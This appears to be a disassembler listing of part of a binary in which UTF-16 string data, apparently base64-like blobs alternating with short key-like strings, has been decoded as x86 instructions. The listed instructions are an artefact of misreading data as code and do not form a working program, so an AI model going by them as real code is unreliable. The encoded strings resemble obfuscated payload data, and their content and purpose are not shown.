10003c05:	00 62 00             	add    %ah,0x0(%edx)
10003c08:	33 00                	xor    (%eax),%eax
10003c0a:	68 00 57 00 61       	push   $0x61005700
10003c0f:	00 6e 00             	add    %ch,0x0(%esi)
10003c12:	4a                   	dec    %edx
10003c13:	00 48 00             	add    %cl,0x0(%eax)
10003c16:	52                   	push   %edx
10003c17:	00 55 00             	add    %dl,0x0(%ebp)
10003c1a:	31 00                	xor    %eax,(%eax)
10003c1c:	77 00                	ja     0x10003c1e
10003c1e:	53                   	push   %ebx
10003c1f:	00 6d 00             	add    %ch,0x0(%ebp)
10003c22:	39 00                	cmp    %eax,(%eax)
10003c24:	34 00                	xor    $0x0,%al
10003c26:	56                   	push   %esi
10003c27:	00 6d 00             	add    %ch,0x0(%ebp)
10003c2a:	70 00                	jo     0x10003c2c
10003c2c:	79 00                	jns    0x10003c2e
10003c2e:	52                   	push   %edx
10003c2f:	00 7a 00             	add    %bh,0x0(%edx)
10003c32:	6c                   	insb   (%dx),%es:(%edi)
10003c33:	00 71 00             	add    %dh,0x0(%ecx)
10003c36:	57                   	push   %edi
10003c37:	00 6b 00             	add    %ch,0x0(%ebx)
10003c3a:	56                   	push   %esi
10003c3b:	00 4e 00             	add    %cl,0x0(%esi)
10003c3e:	63 00                	arpl   %eax,(%eax)
10003c40:	45                   	inc    %ebp
10003c41:	00 70 00             	add    %dh,0x0(%eax)
10003c44:	76 00                	jbe    0x10003c46
10003c46:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003c4a:	5a                   	pop    %edx
10003c4b:	00 71 00             	add    %dh,0x0(%ecx)
10003c4e:	63 00                	arpl   %eax,(%eax)
10003c50:	6b 00 64             	imul   $0x64,(%eax),%eax
10003c53:	00 46 00             	add    %al,0x0(%esi)
10003c56:	54                   	push   %esp
10003c57:	00 58 00             	add    %bl,0x0(%eax)
10003c5a:	42                   	inc    %edx
10003c5b:	00 4b 00             	add    %cl,0x0(%ebx)
10003c5e:	62 00                	bound  %eax,(%eax)
10003c60:	33 00                	xor    (%eax),%eax
10003c62:	68 00 57 00 61       	push   $0x61005700
10003c67:	00 6e 00             	add    %ch,0x0(%esi)
10003c6a:	4a                   	dec    %edx
10003c6b:	00 48 00             	add    %cl,0x0(%eax)
10003c6e:	57                   	push   %edi
10003c6f:	00 45 00             	add    %al,0x0(%ebp)
10003c72:	35 00 36 00 52       	xor    $0x52003600,%eax
10003c77:	00 55 00             	add    %dl,0x0(%ebp)
10003c7a:	31 00                	xor    %eax,(%eax)
10003c7c:	77 00                	ja     0x10003c7e
10003c7e:	53                   	push   %ebx
10003c7f:	00 6d 00             	add    %ch,0x0(%ebp)
10003c82:	39 00                	cmp    %eax,(%eax)
10003c84:	34 00                	xor    $0x0,%al
10003c86:	56                   	push   %esi
10003c87:	00 6d 00             	add    %ch,0x0(%ebp)
10003c8a:	70 00                	jo     0x10003c8c
10003c8c:	79 00                	jns    0x10003c8e
10003c8e:	52                   	push   %edx
10003c8f:	00 30                	add    %dh,(%eax)
10003c91:	00 56 00             	add    %dl,0x0(%esi)
10003c94:	4e                   	dec    %esi
10003c95:	00 63 00             	add    %ah,0x0(%ebx)
10003c98:	45                   	inc    %ebp
10003c99:	00 70 00             	add    %dh,0x0(%eax)
10003c9c:	76 00                	jbe    0x10003c9e
10003c9e:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003ca2:	5a                   	pop    %edx
10003ca3:	00 71 00             	add    %dh,0x0(%ecx)
10003ca6:	63 00                	arpl   %eax,(%eax)
10003ca8:	6b 00 64             	imul   $0x64,(%eax),%eax
10003cab:	00 4a 00             	add    %cl,0x0(%edx)
10003cae:	52                   	push   %edx
10003caf:	00 7a 00             	add    %bh,0x0(%edx)
10003cb2:	46                   	inc    %esi
10003cb3:	00 46 00             	add    %al,0x0(%esi)
10003cb6:	54                   	push   %esp
10003cb7:	00 58 00             	add    %bl,0x0(%eax)
10003cba:	42                   	inc    %edx
10003cbb:	00 4b 00             	add    %cl,0x0(%ebx)
10003cbe:	62 00                	bound  %eax,(%eax)
10003cc0:	33 00                	xor    (%eax),%eax
10003cc2:	68 00 57 00 61       	push   $0x61005700
10003cc7:	00 6e 00             	add    %ch,0x0(%esi)
10003cca:	4a                   	dec    %edx
10003ccb:	00 48 00             	add    %cl,0x0(%eax)
10003cce:	52                   	push   %edx
10003ccf:	00 55 00             	add    %dl,0x0(%ebp)
10003cd2:	31 00                	xor    %eax,(%eax)
10003cd4:	77 00                	ja     0x10003cd6
10003cd6:	53                   	push   %ebx
10003cd7:	00 6d 00             	add    %ch,0x0(%ebp)
10003cda:	39 00                	cmp    %eax,(%eax)
10003cdc:	34 00                	xor    $0x0,%al
10003cde:	56                   	push   %esi
10003cdf:	00 6d 00             	add    %ch,0x0(%ebp)
10003ce2:	70 00                	jo     0x10003ce4
10003ce4:	79 00                	jns    0x10003ce6
10003ce6:	52                   	push   %edx
10003ce7:	00 32                	add    %dh,(%edx)
10003ce9:	00 78 00             	add    %bh,0x0(%eax)
10003cec:	69 00 56 00 30 00    	imul   $0x300056,(%eax),%eax
10003cf2:	56                   	push   %esi
10003cf3:	00 4e 00             	add    %cl,0x0(%esi)
10003cf6:	63 00                	arpl   %eax,(%eax)
10003cf8:	45                   	inc    %ebp
10003cf9:	00 70 00             	add    %dh,0x0(%eax)
10003cfc:	76 00                	jbe    0x10003cfe
10003cfe:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003d02:	5a                   	pop    %edx
10003d03:	00 71 00             	add    %dh,0x0(%ecx)
10003d06:	63 00                	arpl   %eax,(%eax)
10003d08:	6b 00 64             	imul   $0x64,(%eax),%eax
10003d0b:	00 46 00             	add    %al,0x0(%esi)
10003d0e:	54                   	push   %esp
10003d0f:	00 58 00             	add    %bl,0x0(%eax)
10003d12:	42                   	inc    %edx
10003d13:	00 4b 00             	add    %cl,0x0(%ebx)
10003d16:	62 00                	bound  %eax,(%eax)
10003d18:	33 00                	xor    (%eax),%eax
10003d1a:	68 00 57 00 61       	push   $0x61005700
10003d1f:	00 6e 00             	add    %ch,0x0(%esi)
10003d22:	4a                   	dec    %edx
10003d23:	00 48 00             	add    %cl,0x0(%eax)
10003d26:	4f                   	dec    %edi
10003d27:	00 58 00             	add    %bl,0x0(%eax)
10003d2a:	6c                   	insb   (%dx),%es:(%edi)
10003d2b:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003d2f:	00 55 00             	add    %dl,0x0(%ebp)
10003d32:	31 00                	xor    %eax,(%eax)
10003d34:	77 00                	ja     0x10003d36
10003d36:	53                   	push   %ebx
10003d37:	00 6d 00             	add    %ch,0x0(%ebp)
10003d3a:	39 00                	cmp    %eax,(%eax)
10003d3c:	34 00                	xor    $0x0,%al
10003d3e:	56                   	push   %esi
10003d3f:	00 6d 00             	add    %ch,0x0(%ebp)
10003d42:	70 00                	jo     0x10003d44
10003d44:	79 00                	jns    0x10003d46
10003d46:	52                   	push   %edx
10003d47:	00 30                	add    %dh,(%eax)
10003d49:	00 56 00             	add    %dl,0x0(%esi)
10003d4c:	4e                   	dec    %esi
10003d4d:	00 63 00             	add    %ah,0x0(%ebx)
10003d50:	45                   	inc    %ebp
10003d51:	00 70 00             	add    %dh,0x0(%eax)
10003d54:	76 00                	jbe    0x10003d56
10003d56:	65 00 46 00          	add    %al,%gs:0x0(%esi)
10003d5a:	5a                   	pop    %edx
10003d5b:	00 71 00             	add    %dh,0x0(%ecx)
10003d5e:	63 00                	arpl   %eax,(%eax)
10003d60:	6b 00 64             	imul   $0x64,(%eax),%eax
10003d63:	00 52 00             	add    %dl,0x0(%edx)
10003d66:	50                   	push   %eax
10003d67:	00 54 00 31          	add    %dl,0x31(%eax,%eax,1)
10003d6b:	00 46 00             	add    %al,0x0(%esi)
10003d6e:	54                   	push   %esp
10003d6f:	00 58 00             	add    %bl,0x0(%eax)
10003d72:	42                   	inc    %edx
10003d73:	00 4b 00             	add    %cl,0x0(%ebx)
10003d76:	62 00                	bound  %eax,(%eax)
10003d78:	33 00                	xor    (%eax),%eax
10003d7a:	68 00 57 00 61       	push   $0x61005700
10003d7f:	00 6e 00             	add    %ch,0x0(%esi)
10003d82:	4a                   	dec    %edx
10003d83:	00 48 00             	add    %cl,0x0(%eax)
10003d86:	00 15 45 00 4d 00    	add    %dl,0x4d0045
10003d8c:	70 00                	jo     0x10003d8e
10003d8e:	4a                   	dec    %edx
10003d8f:	00 6f 00             	add    %ch,0x0(%edi)
10003d92:	78 00                	js     0x10003d94
10003d94:	56                   	push   %esi
10003d95:	00 6a 00             	add    %ch,0x0(%edx)
10003d98:	72 00                	jb     0x10003d9a
10003d9a:	47                   	inc    %edi
10003d9b:	00 00                	add    %al,(%eax)
10003d9d:	81 b1 59 00 6b 00 6c 	xorl   $0x48006c,0x6b0059(%ecx)
10003da4:	00 48 00 
10003da7:	51                   	push   %ecx
10003da8:	00 57 00             	add    %dl,0x0(%edi)
10003dab:	56                   	push   %esi
10003dac:	00 49 00             	add    %cl,0x0(%ecx)
10003daf:	5a                   	pop    %edx
10003db0:	00 7a 00             	add    %bh,0x0(%edx)
10003db3:	56                   	push   %esi
10003db4:	00 72 00             	add    %dh,0x0(%edx)
10003db7:	57                   	push   %edi
10003db8:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
10003dbc:	00 59 00             	add    %bl,0x0(%ecx)
10003dbf:	54                   	push   %esp
10003dc0:	00 6d 00             	add    %ch,0x0(%ebp)
10003dc3:	4a                   	dec    %edx
10003dc4:	00 4a 00             	add    %cl,0x0(%edx)
10003dc7:	52                   	push   %edx
10003dc8:	00 30                	add    %dh,(%eax)
10003dca:	00 46 00             	add    %al,0x0(%esi)
10003dcd:	6c                   	insb   (%dx),%es:(%edi)
10003dce:	00 53 00             	add    %dl,0x0(%ebx)
10003dd1:	47                   	inc    %edi
10003dd2:	00 63 00             	add    %ah,0x0(%ebx)
10003dd5:	31 00                	xor    %eax,(%eax)
10003dd7:	61                   	popa
10003dd8:	00 31                	add    %dh,(%ecx)
10003dda:	00 70 00             	add    %dh,0x0(%eax)
10003ddd:	69 00 53 00 55 00    	imul   $0x550053,(%eax),%eax
10003de3:	64 00 42 00          	add    %al,%fs:0x0(%edx)
10003de7:	5a                   	pop    %edx
10003de8:	00 55 00             	add    %dl,0x0(%ebp)
10003deb:	68 00 6e 00 4e       	push   $0x4e006e00
10003df0:	00 57 00             	add    %dl,0x0(%edi)
10003df3:	74 00                	je     0x10003df5
10003df5:	61                   	popa
10003df6:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
10003dfa:	00 4a 00             	add    %cl,0x0(%edx)
10003dfd:	74 00                	je     0x10003dff
10003dff:	59                   	pop    %ecx
10003e00:	00 6b 00             	add    %ch,0x0(%ebx)
10003e03:	6c                   	insb   (%dx),%es:(%edi)
10003e04:	00 48 00             	add    %cl,0x0(%eax)
10003e07:	51                   	push   %ecx
10003e08:	00 57 00             	add    %dl,0x0(%edi)
10003e0b:	56                   	push   %esi
10003e0c:	00 49 00             	add    %cl,0x0(%ecx)
10003e0f:	5a                   	pop    %edx
10003e10:	00 7a 00             	add    %bh,0x0(%edx)
10003e13:	56                   	push   %esi
10003e14:	00 72 00             	add    %dh,0x0(%edx)
10003e17:	57                   	push   %edi
10003e18:	00 6d 00             	add    %ch,0x0(%ebp)
10003e1b:	4a                   	dec    %edx
10003e1c:	00 4a 00             	add    %cl,0x0(%edx)
10003e1f:	52                   	push   %edx
10003e20:	00 30                	add    %dh,(%eax)
10003e22:	00 46 00             	add    %al,0x0(%esi)
10003e25:	6c                   	insb   (%dx),%es:(%edi)
10003e26:	00 53 00             	add    %dl,0x0(%ebx)
10003e29:	47                   	inc    %edi
10003e2a:	00 63 00             	add    %ah,0x0(%ebx)
10003e2d:	31 00                	xor    %eax,(%eax)
10003e2f:	61                   	popa
10003e30:	00 31                	add    %dh,(%ecx)
10003e32:	00 70 00             	add    %dh,0x0(%eax)
10003e35:	57                   	push   %edi
10003e36:	00 4d 00             	add    %cl,0x0(%ebp)
10003e39:	46                   	inc    %esi
10003e3a:	00 68 00             	add    %ch,0x0(%eax)
10003e3d:	69 00 53 00 55 00    	imul   $0x550053,(%eax),%eax
10003e43:	64 00 42 00          	add    %al,%fs:0x0(%edx)
10003e47:	5a                   	pop    %edx
10003e48:	00 55 00             	add    %dl,0x0(%ebp)
10003e4b:	68 00 6e 00 4e       	push   $0x4e006e00
10003e50:	00 57 00             	add    %dl,0x0(%edi)
10003e53:	74 00                	je     0x10003e55
10003e55:	61                   	popa
10003e56:	00 59 00             	add    %bl,0x0(%ecx)
10003e59:	6b 00 6c             	imul   $0x6c,(%eax),%eax
10003e5c:	00 48 00             	add    %cl,0x0(%eax)
10003e5f:	51                   	push   %ecx
10003e60:	00 57 00             	add    %dl,0x0(%edi)
10003e63:	56                   	push   %esi
10003e64:	00 49 00             	add    %cl,0x0(%ecx)
10003e67:	5a                   	pop    %edx
10003e68:	00 7a 00             	add    %bh,0x0(%edx)
10003e6b:	56                   	push   %esi
10003e6c:	00 72 00             	add    %dh,0x0(%edx)
10003e6f:	57                   	push   %edi
10003e70:	00 6a 00             	add    %ch,0x0(%edx)
10003e73:	4e                   	dec    %esi
10003e74:	00 4b 00             	add    %cl,0x0(%ebx)
10003e77:	62 00                	bound  %eax,(%eax)
10003e79:	47                   	inc    %edi
10003e7a:	00 4a 00             	add    %cl,0x0(%edx)
10003e7d:	4a                   	dec    %edx
10003e7e:	00 52 00             	add    %dl,0x0(%edx)
10003e81:	30 00                	xor    %al,(%eax)
10003e83:	46                   	inc    %esi
10003e84:	00 6c 00 53          	add    %ch,0x53(%eax,%eax,1)
10003e88:	00 47 00             	add    %al,0x0(%edi)
10003e8b:	63 00                	arpl   %eax,(%eax)
10003e8d:	31 00                	xor    %eax,(%eax)
10003e8f:	61                   	popa
10003e90:	00 31                	add    %dh,(%ecx)
10003e92:	00 70 00             	add    %dh,0x0(%eax)
10003e95:	69 00 53 00 55 00    	imul   $0x550053,(%eax),%eax
10003e9b:	64 00 42 00          	add    %al,%fs:0x0(%edx)
10003e9f:	5a                   	pop    %edx
10003ea0:	00 55 00             	add    %dl,0x0(%ebp)
10003ea3:	68 00 6e 00 4e       	push   $0x4e006e00
10003ea8:	00 57 00             	add    %dl,0x0(%edi)
10003eab:	74 00                	je     0x10003ead
10003ead:	61                   	popa
10003eae:	00 57 00             	add    %dl,0x0(%edi)
10003eb1:	6a 00                	push   $0x0
10003eb3:	4e                   	dec    %esi
10003eb4:	00 4f 00             	add    %cl,0x0(%edi)
10003eb7:	59                   	pop    %ecx
10003eb8:	00 6b 00             	add    %ch,0x0(%ebx)
10003ebb:	6c                   	insb   (%dx),%es:(%edi)
10003ebc:	00 48 00             	add    %cl,0x0(%eax)
10003ebf:	51                   	push   %ecx
10003ec0:	00 57 00             	add    %dl,0x0(%edi)
10003ec3:	56                   	push   %esi
10003ec4:	00 49 00             	add    %cl,0x0(%ecx)
10003ec7:	5a                   	pop    %edx
10003ec8:	00 7a 00             	add    %bh,0x0(%edx)
10003ecb:	56                   	push   %esi
10003ecc:	00 72 00             	add    %dh,0x0(%edx)
10003ecf:	57                   	push   %edi
10003ed0:	00 6d 00             	add    %ch,0x0(%ebp)
10003ed3:	4a                   	dec    %edx
10003ed4:	00 4a 00             	add    %cl,0x0(%edx)
10003ed7:	52                   	push   %edx
10003ed8:	00 30                	add    %dh,(%eax)
10003eda:	00 46 00             	add    %al,0x0(%esi)
10003edd:	6c                   	insb   (%dx),%es:(%edi)
10003ede:	00 53 00             	add    %dl,0x0(%ebx)
10003ee1:	47                   	inc    %edi
10003ee2:	00 63 00             	add    %ah,0x0(%ebx)
10003ee5:	31 00                	xor    %eax,(%eax)
10003ee7:	61                   	popa
10003ee8:	00 31                	add    %dh,(%ecx)
10003eea:	00 70 00             	add    %dh,0x0(%eax)
10003eed:	34 00                	xor    $0x0,%al
10003eef:	59                   	pop    %ecx
10003ef0:	00 6b 00             	add    %ch,0x0(%ebx)
10003ef3:	46                   	inc    %esi
10003ef4:	00 69 00             	add    %ch,0x0(%ecx)
10003ef7:	53                   	push   %ebx
10003ef8:	00 55 00             	add    %dl,0x0(%ebp)
10003efb:	64 00 42 00          	add    %al,%fs:0x0(%edx)
10003eff:	5a                   	pop    %edx
10003f00:	00 55 00             	add    %dl,0x0(%ebp)
10003f03:	68 00 6e 00 4e       	push   $0x4e006e00
10003f08:	00 57 00             	add    %dl,0x0(%edi)
10003f0b:	74 00                	je     0x10003f0d
10003f0d:	61                   	popa
10003f0e:	00 59 00             	add    %bl,0x0(%ecx)
10003f11:	6b 00 6c             	imul   $0x6c,(%eax),%eax
10003f14:	00 48 00             	add    %cl,0x0(%eax)
10003f17:	51                   	push   %ecx
10003f18:	00 57 00             	add    %dl,0x0(%edi)
10003f1b:	56                   	push   %esi
10003f1c:	00 49 00             	add    %cl,0x0(%ecx)
10003f1f:	5a                   	pop    %edx
10003f20:	00 7a 00             	add    %bh,0x0(%edx)
10003f23:	56                   	push   %esi
10003f24:	00 72 00             	add    %dh,0x0(%edx)
10003f27:	57                   	push   %edi
10003f28:	00 6a 00             	add    %ch,0x0(%edx)
10003f2b:	30 00                	xor    %al,(%eax)
10003f2d:	39 00                	cmp    %eax,(%eax)
10003f2f:	59                   	pop    %ecx
10003f30:	00 6b 00             	add    %ch,0x0(%ebx)
10003f33:	6c                   	insb   (%dx),%es:(%edi)
10003f34:	00 48 00             	add    %cl,0x0(%eax)
10003f37:	51                   	push   %ecx
10003f38:	00 57 00             	add    %dl,0x0(%edi)
10003f3b:	56                   	push   %esi
10003f3c:	00 49 00             	add    %cl,0x0(%ecx)
10003f3f:	5a                   	pop    %edx
10003f40:	00 7a 00             	add    %bh,0x0(%edx)
10003f43:	56                   	push   %esi
10003f44:	00 72 00             	add    %dh,0x0(%edx)
10003f47:	57                   	push   %edi
10003f48:	00 67 00             	add    %ah,0x0(%edi)
10003f4b:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10003f50:	15 62 00 49 00       	adc    $0x490062,%eax
10003f55:	47                   	inc    %edi
10003f56:	00 41 00             	add    %al,0x0(%ecx)
10003f59:	65 00 48 00          	add    %cl,%gs:0x0(%eax)
10003f5d:	67 00 35             	add    %dh,(%di)
10003f60:	00 6b 00             	add    %ch,0x0(%ebx)
10003f63:	5a                   	pop    %edx
10003f64:	00 00                	add    %al,(%eax)
10003f66:	81 b1 63 00 46 00 46 	xorl   $0x540046,0x460063(%ecx)
10003f6d:	00 54 00 
10003f70:	61                   	popa
10003f71:	00 47 00             	add    %al,0x0(%edi)
10003f74:	39 00                	cmp    %eax,(%eax)
10003f76:	55                   	push   %ebp
10003f77:	00 59 00             	add    %bl,0x0(%ecx)
10003f7a:	6c                   	insb   (%dx),%es:(%edi)
10003f7b:	00 52 00             	add    %dl,0x0(%edx)
10003f7e:	5a                   	pop    %edx
10003f7f:	00 61 00             	add    %ah,0x0(%ecx)
10003f82:	46                   	inc    %esi
10003f83:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
10003f87:	00 54 00 6e          	add    %dl,0x6e(%eax,%eax,1)
10003f8b:	00 42 00             	add    %al,0x0(%edx)
10003f8e:	52                   	push   %edx
10003f8f:	00 55 00             	add    %dl,0x0(%ebp)
10003f92:	32 00                	xor    (%eax),%al
10003f94:	68 00 76 00 56       	push   $0x56007600
10003f99:	00 47 00             	add    %al,0x0(%edi)
10003f9c:	4a                   	dec    %edx
10003f9d:	00 55 00             	add    %dl,0x0(%ebp)
10003fa0:	57                   	push   %edi
10003fa1:	00 57 00             	add    %dl,0x0(%edi)
10003fa4:	68 00 77 00 55       	push   $0x55007700
10003fa9:	00 56 00             	add    %dl,0x0(%esi)
10003fac:	4e                   	dec    %esi
10003fad:	00 6f 00             	add    %ch,0x0(%edi)
10003fb0:	62 00                	bound  %eax,(%eax)
10003fb2:	31 00                	xor    %eax,(%eax)
10003fb4:	52                   	push   %edx
10003fb5:	00 69 00             	add    %ch,0x0(%ecx)
10003fb8:	56                   	push   %esi
10003fb9:	00 46 00             	add    %al,0x0(%esi)
10003fbc:	6c                   	insb   (%dx),%es:(%edi)
10003fbd:	00 6f 00             	add    %ch,0x0(%edi)
10003fc0:	64 00 32             	add    %dh,%fs:(%edx)
10003fc3:	00 4a 00             	add    %cl,0x0(%edx)
10003fc6:	74 00                	je     0x10003fc8
10003fc8:	63 00                	arpl   %eax,(%eax)
10003fca:	46                   	inc    %esi
10003fcb:	00 46 00             	add    %al,0x0(%esi)
10003fce:	54                   	push   %esp
10003fcf:	00 61 00             	add    %ah,0x0(%ecx)
10003fd2:	47                   	inc    %edi
10003fd3:	00 39                	add    %bh,(%ecx)
10003fd5:	00 55 00             	add    %dl,0x0(%ebp)
10003fd8:	59                   	pop    %ecx
10003fd9:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10003fdd:	00 5a 00             	add    %bl,0x0(%edx)
10003fe0:	61                   	popa
10003fe1:	00 48 00             	add    %cl,0x0(%eax)
10003fe4:	42                   	inc    %edx
10003fe5:	00 52 00             	add    %dl,0x0(%edx)
10003fe8:	55                   	push   %ebp
10003fe9:	00 32                	add    %dh,(%edx)
10003feb:	00 68 00             	add    %ch,0x0(%eax)
10003fee:	76 00                	jbe    0x10003ff0
10003ff0:	56                   	push   %esi
10003ff1:	00 47 00             	add    %al,0x0(%edi)
10003ff4:	4a                   	dec    %edx
10003ff5:	00 55 00             	add    %dl,0x0(%ebp)
10003ff8:	57                   	push   %edi
10003ff9:	00 57 00             	add    %dl,0x0(%edi)
10003ffc:	68 00 57 00 4d       	push   $0x4d005700
10004001:	00 46 00             	add    %al,0x0(%esi)
10004004:	68 00 77 00 55       	push   $0x55007700
10004009:	00 56 00             	add    %dl,0x0(%esi)
1000400c:	4e                   	dec    %esi
1000400d:	00 6f 00             	add    %ch,0x0(%edi)
10004010:	62 00                	bound  %eax,(%eax)
10004012:	31 00                	xor    %eax,(%eax)
10004014:	52                   	push   %edx
10004015:	00 69 00             	add    %ch,0x0(%ecx)
10004018:	56                   	push   %esi
10004019:	00 46 00             	add    %al,0x0(%esi)
1000401c:	6c                   	insb   (%dx),%es:(%edi)
1000401d:	00 6f 00             	add    %ch,0x0(%edi)
10004020:	63 00                	arpl   %eax,(%eax)
10004022:	46                   	inc    %esi
10004023:	00 46 00             	add    %al,0x0(%esi)
10004026:	54                   	push   %esp
10004027:	00 61 00             	add    %ah,0x0(%ecx)
1000402a:	47                   	inc    %edi
1000402b:	00 39                	add    %bh,(%ecx)
1000402d:	00 55 00             	add    %dl,0x0(%ebp)
10004030:	59                   	pop    %ecx
10004031:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10004035:	00 5a 00             	add    %bl,0x0(%edx)
10004038:	61                   	popa
10004039:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
1000403d:	00 4f 00             	add    %cl,0x0(%edi)
10004040:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10004044:	42                   	inc    %edx
10004045:	00 52 00             	add    %dl,0x0(%edx)
10004048:	55                   	push   %ebp
10004049:	00 32                	add    %dh,(%edx)
1000404b:	00 68 00             	add    %ch,0x0(%eax)
1000404e:	76 00                	jbe    0x10004050
10004050:	56                   	push   %esi
10004051:	00 47 00             	add    %al,0x0(%edi)
10004054:	4a                   	dec    %edx
10004055:	00 55 00             	add    %dl,0x0(%ebp)
10004058:	57                   	push   %edi
10004059:	00 57 00             	add    %dl,0x0(%edi)
1000405c:	68 00 77 00 55       	push   $0x55007700
10004061:	00 56 00             	add    %dl,0x0(%esi)
10004064:	4e                   	dec    %esi
10004065:	00 6f 00             	add    %ch,0x0(%edi)
10004068:	62 00                	bound  %eax,(%eax)
1000406a:	31 00                	xor    %eax,(%eax)
1000406c:	52                   	push   %edx
1000406d:	00 69 00             	add    %ch,0x0(%ecx)
10004070:	56                   	push   %esi
10004071:	00 46 00             	add    %al,0x0(%esi)
10004074:	6c                   	insb   (%dx),%es:(%edi)
10004075:	00 6f 00             	add    %ch,0x0(%edi)
10004078:	59                   	pop    %ecx
10004079:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
1000407d:	00 43 00             	add    %al,0x0(%ebx)
10004080:	63 00                	arpl   %eax,(%eax)
10004082:	46                   	inc    %esi
10004083:	00 46 00             	add    %al,0x0(%esi)
10004086:	54                   	push   %esp
10004087:	00 61 00             	add    %ah,0x0(%ecx)
1000408a:	47                   	inc    %edi
1000408b:	00 39                	add    %bh,(%ecx)
1000408d:	00 55 00             	add    %dl,0x0(%ebp)
10004090:	59                   	pop    %ecx
10004091:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
10004095:	00 5a 00             	add    %bl,0x0(%edx)
10004098:	61                   	popa
10004099:	00 48 00             	add    %cl,0x0(%eax)
1000409c:	42                   	inc    %edx
1000409d:	00 52 00             	add    %dl,0x0(%edx)
100040a0:	55                   	push   %ebp
100040a1:	00 32                	add    %dh,(%edx)
100040a3:	00 68 00             	add    %ch,0x0(%eax)
100040a6:	76 00                	jbe    0x100040a8
100040a8:	56                   	push   %esi
100040a9:	00 47 00             	add    %al,0x0(%edi)
100040ac:	4a                   	dec    %edx
100040ad:	00 55 00             	add    %dl,0x0(%ebp)
100040b0:	57                   	push   %edi
100040b1:	00 57 00             	add    %dl,0x0(%edi)
100040b4:	68 00 77 00 59       	push   $0x59007700
100040b9:	00 6b 00             	add    %ch,0x0(%ebx)
100040bc:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
100040c0:	55                   	push   %ebp
100040c1:	00 56 00             	add    %dl,0x0(%esi)
100040c4:	4e                   	dec    %esi
100040c5:	00 6f 00             	add    %ch,0x0(%edi)
100040c8:	62 00                	bound  %eax,(%eax)
100040ca:	31 00                	xor    %eax,(%eax)
100040cc:	52                   	push   %edx
100040cd:	00 69 00             	add    %ch,0x0(%ecx)
100040d0:	56                   	push   %esi
100040d1:	00 46 00             	add    %al,0x0(%esi)
100040d4:	6c                   	insb   (%dx),%es:(%edi)
100040d5:	00 6f 00             	add    %ch,0x0(%edi)
100040d8:	63 00                	arpl   %eax,(%eax)
100040da:	46                   	inc    %esi
100040db:	00 46 00             	add    %al,0x0(%esi)
100040de:	54                   	push   %esp
100040df:	00 61 00             	add    %ah,0x0(%ecx)
100040e2:	47                   	inc    %edi
100040e3:	00 39                	add    %bh,(%ecx)
100040e5:	00 55 00             	add    %dl,0x0(%ebp)
100040e8:	59                   	pop    %ecx
100040e9:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
100040ed:	00 5a 00             	add    %bl,0x0(%edx)
100040f0:	61                   	popa
100040f1:	00 46 00             	add    %al,0x0(%esi)
100040f4:	5a                   	pop    %edx
100040f5:	00 35 00 63 00 46    	add    %dh,0x46006300
100040fb:	00 46 00             	add    %al,0x0(%esi)
100040fe:	54                   	push   %esp
100040ff:	00 61 00             	add    %ah,0x0(%ecx)
10004102:	47                   	inc    %edi
10004103:	00 39                	add    %bh,(%ecx)
10004105:	00 55 00             	add    %dl,0x0(%ebp)
10004108:	59                   	pop    %ecx
10004109:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
1000410d:	00 5a 00             	add    %bl,0x0(%edx)
10004110:	61                   	popa
10004111:	00 41 00             	add    %al,0x0(%ecx)
10004114:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
10004119:	15 70 00 51 00       	adc    $0x510070,%eax
1000411e:	53                   	push   %ebx
1000411f:	00 68 00             	add    %ch,0x0(%eax)
10004122:	6f                   	outsl  %ds:(%esi),(%dx)
10004123:	00 54 00 62          	add    %dl,0x62(%eax,%eax,1)
10004127:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
1000412b:	00 68 00             	add    %ch,0x0(%eax)
1000412e:	00 80 b9 52 00 45    	add    %al,0x450052b9(%eax)
10004134:	00 78 00             	add    %bh,0x0(%eax)
10004137:	6b 00 61             	imul   $0x61,(%eax),%eax
1000413a:	00 30                	add    %dh,(%eax)
1000413c:	00 49 00             	add    %cl,0x0(%ecx)
1000413f:	33 00                	xor    (%eax),%eax
10004141:	5a                   	pop    %edx
10004142:	00 33                	add    %dh,(%ebx)
10004144:	00 41 00             	add    %al,0x0(%ecx)
10004147:	7a 00                	jp     0x10004149
10004149:	63 00                	arpl   %eax,(%eax)
1000414b:	46                   	inc    %esi
1000414c:	00 56 00             	add    %dl,0x0(%esi)
1000414f:	74 00                	je     0x10004151
10004151:	56                   	push   %esi
10004152:	00 6b 00             	add    %ch,0x0(%ebx)
10004155:	52                   	push   %edx
10004156:	00 4d 00             	add    %cl,0x0(%ebp)
10004159:	5a                   	pop    %edx
1000415a:	00 47 00             	add    %al,0x0(%edi)
1000415d:	74 00                	je     0x1000415f
1000415f:	43                   	inc    %ebx
10004160:	00 4e 00             	add    %cl,0x0(%esi)
10004163:	32 00                	xor    (%eax),%al
10004165:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
10004169:	4d                   	dec    %ebp
1000416a:	00 33                	add    %dh,(%ebx)
1000416c:	00 42 00             	add    %al,0x0(%edx)
1000416f:	45                   	inc    %ebp
10004170:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
10004174:	00 52 00             	add    %dl,0x0(%edx)
10004177:	72 00                	jb     0x10004179
10004179:	51                   	push   %ecx
1000417a:	00 6a 00             	add    %ch,0x0(%edx)
1000417d:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
10004181:	63 00                	arpl   %eax,(%eax)
10004183:	44                   	inc    %esp
10004184:	00 4e 00             	add    %cl,0x0(%esi)
10004187:	77 00                	ja     0x10004189
10004189:	62 00                	bound  %eax,(%eax)
1000418b:	6c                   	insb   (%dx),%es:(%edi)
